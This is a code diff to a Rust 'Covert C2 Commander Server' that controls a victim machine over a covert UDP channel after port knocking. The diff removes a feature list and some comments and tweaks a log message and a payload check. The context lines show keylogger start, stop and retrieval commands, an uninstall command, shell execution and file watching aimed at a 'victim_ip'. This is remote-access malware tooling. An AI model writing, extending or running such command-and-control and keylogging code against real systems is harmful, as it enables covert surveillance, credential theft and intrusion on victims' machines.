@@ -1,15 +1,4 @@
 /// Covert C2 Commander Server
-///
-/// Features:
-/// - Menu-driven state machine (Disconnected/Connected)
-/// - Port knock initiation via port_knkr module
-/// - Covert UDP channel for C2 commands
-/// - Keylogger control, shell execution, file transfer
-/// - File watch with delta streaming
-///
-/// Compliance: All protocol data in UDP payload only.
-/// UDP header fields are OS-managed; no transport-layer abuse.
-
 use std::collections::HashMap;
 use std::io::{self, Write};
 use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
@@ -21,7 +10,6 @@ use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet_datalink as datalink;
 
-// Import modules
 mod port_knkr;
 mod packet;
 
@@ -35,19 +23,16 @@ use packet::{PacketHeader, HEADER_SIZE,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
-// Configuration
 const BUFFER_SIZE: usize = 4096;
 const MAX_RETRIES: u32 = 3;
 const CHUNK_SIZE: usize = 1024;
 
-// Session state machine
 #[derive(Clone, Copy, PartialEq)]
 enum SessionState {
     Disconnected,
     Connected,
 }
 
-// C2 Commander struct
 pub struct Commander {
     state: SessionState,
     victim_ip: Option<Ipv4Addr>,
@@ -95,7 +80,7 @@ impl Commander {
         ctrlc::set_handler(move || {
             println!("\nShutdown signal received");
             if watch_active_clone.load(Ordering::SeqCst) {
-                println!("[*] Stopping file watch...");
+                println!("[*] Stopping watch...");
                 watch_active_clone.store(false, Ordering::SeqCst);
             } else {
                 shutdown.store(false, Ordering::SeqCst);
@@ -354,7 +339,7 @@ impl Commander {
                             if let Some(ip) = self.victim_ip {
                                 match header.subtype {
                                     FILE_WATCH_UPDATE => {
-                                        if header.content_length > 0 {
+                                        if payload.len() > 0 {
                                             self.file_watch_buffer.entry(ip)
                                                 .or_insert_with(Vec::new)
                                                 .extend_from_slice(payload);
@@ -655,7 +640,6 @@ impl Commander {
             stop_request.push(0x74);
             stop_request.push(remote_path.as_bytes().len() as u8);
             stop_request.extend_from_slice(remote_path.as_bytes());
-
             let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
         }
 
